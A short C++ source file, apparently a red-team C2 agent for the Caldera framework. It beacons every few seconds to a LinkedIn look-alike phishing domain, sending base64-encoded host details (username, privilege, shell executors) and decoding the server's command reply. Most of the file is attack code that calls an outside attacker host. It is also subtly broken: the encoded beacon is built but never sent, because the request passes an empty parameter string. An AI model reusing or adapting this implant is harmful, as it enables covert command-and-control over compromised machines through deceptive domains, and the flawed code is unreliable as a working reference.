// RedTeamAgent.cpp
// This agent opens up an HTTP session and transmits data to a phishing domain that I have 
// configured to point to Caldera. The data being sent is json data encoded in base64.
// We can use regular expressions to remove bad characters from the transmitted data.

#include "main.h"
#include <regex>

const char* Params = ""; // JSON data for transmission encoded in base64 goes here.


int main()
{
	while (true)
	{
		std::string msg = "{\"paw\":\"malwr\", \"pid\":\"1200\",\"server\":\"" + std::string("linkedinsolutions.com") + "\",\"platform\":\"windows\",\"host\":\"http-malware\", \
		\"username\":\"grantk\",\"architecture\":\"amd64\",\"privilege\":\"User\", \"executors\":[\"cmd\", \"psh\"]}";

		char* encodedmsg = b64encode((char*)msg.c_str(), msg.length());
		printf("Our Encoded Msg: %s\n", encodedmsg);

		HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", Params);
		if (hSession != NULL)
		{
			printf("Data has been sent successfully\n");
		}
		else
		{
			printf("Error in sending data\n");
		}
		DWORD Length = 0;
		char* Response = GetResponse(hSession, &Length);
		printf("Caldera Response: %s\n", Response);
		char* DecodedResponse = b64decode(Response, Length);
		string response = DecodedResponse;
		response = regex_replace(response, regex("\\\\"), "");
		response = regex_replace(response, regex("\"\\["), "[");
		response = regex_replace(response, regex("\"\\{"), "{");
		response = regex_replace(response, regex("\\]\""), "]");
		response = regex_replace(response, regex("\\}\""), "}");
		printf("Caldera Decoded Response: %s\n", response.c_str());
		Sleep(100 * 50);
	}

}
